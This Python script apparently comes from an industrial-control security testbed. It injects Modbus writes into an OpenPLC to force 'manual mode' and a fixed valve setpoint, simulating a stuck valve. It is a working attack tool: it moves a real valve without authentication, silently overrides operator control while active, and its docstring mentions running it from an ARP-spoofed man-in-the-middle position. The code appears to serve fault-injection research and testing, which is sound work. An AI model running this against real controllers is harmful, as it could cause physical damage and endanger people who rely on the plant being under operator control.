#!/usr/bin/env python3
"""Modbus setpoint injection for cyber write-path fault injection (stuck valve).

See docs/cyber-vs-physical-fault-injection-design.md for the design this
implements.

Unlike the read-path faults (modbus_relay.py), this doesn't intercept
anything - it just issues a Modbus write directly to the real target.
Modbus TCP has no authentication, so any network position that can reach
the target's Modbus port at all is sufficient; on a locked-down deployment
where only the HMI's IP is allowed to reach the ICS segment, this would
need to be launched from behind the same ARP-spoofed MITM position used
for the read-path faults (see the design doc's open risks) rather than a
direct connection - this script doesn't care which, it just needs a route
to the target.

Models the OpenPLC "manual mode" attack validated by hand: setting
manual_mode (a coil) forces the ladder logic to use a fixed manual
setpoint instead of its own closed-loop control, moving the real valve
with zero operator involvement - and while it's set, the ladder logic's
`IF manual_mode THEN ... ELSE` means any legitimate operator adjustment
elsewhere is silently ignored too, which is what makes this a believable
"stuck valve" symptom rather than just a one-off unexpected move.
Disabling manual mode hands control back immediately; there's no other
state to clean up.
"""

import argparse
import asyncio

from pymodbus.client import AsyncModbusTcpClient


async def inject(args):
    client = AsyncModbusTcpClient(args.target_host, port=args.target_port)
    connected = await client.connect()
    if not connected:
        print(f"[setpoint_inject] could not connect to {args.target_host}:{args.target_port}", flush=True)
        return

    if args.setpoint is not None:
        result = await client.write_register(args.setpoint_address, args.setpoint, slave=args.target_slave_id)
        if result.isError():
            print(f"[setpoint_inject] setpoint write failed: {result}", flush=True)
        else:
            print(f"[setpoint_inject] wrote {args.setpoint} to holding register {args.setpoint_address}", flush=True)

    result = await client.write_coil(args.mode_coil, args.enable, slave=args.target_slave_id)
    if result.isError():
        print(f"[setpoint_inject] mode-coil write failed: {result}", flush=True)
    else:
        state = "enabled" if args.enable else "disabled"
        print(f"[setpoint_inject] manual mode {state} (coil {args.mode_coil})", flush=True)

    client.close()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target-host", required=True, help="real Modbus target, e.g. the PLC's IP")
    parser.add_argument("--target-port", type=int, default=502)
    parser.add_argument("--target-slave-id", type=int, default=1)
    parser.add_argument("--mode-coil", type=int, default=0, help="manual_mode coil address (%%QX0.0)")
    parser.add_argument("--setpoint-address", type=int, default=10,
                         help="manual setpoint holding register (10=f1, 11=f2, 12=purge, 13=product)")
    parser.add_argument("--setpoint", type=int, default=None,
                         help="0-65535; omit to leave the existing manual setpoint value untouched")
    parser.add_argument("--enable", dest="enable", action="store_true", default=True,
                         help="enable manual mode (default) - this is the attack")
    parser.add_argument("--disable", dest="enable", action="store_false",
                         help="disable manual mode - restores normal closed-loop control")
    args = parser.parse_args()
    asyncio.run(inject(args))


if __name__ == "__main__":
    main()
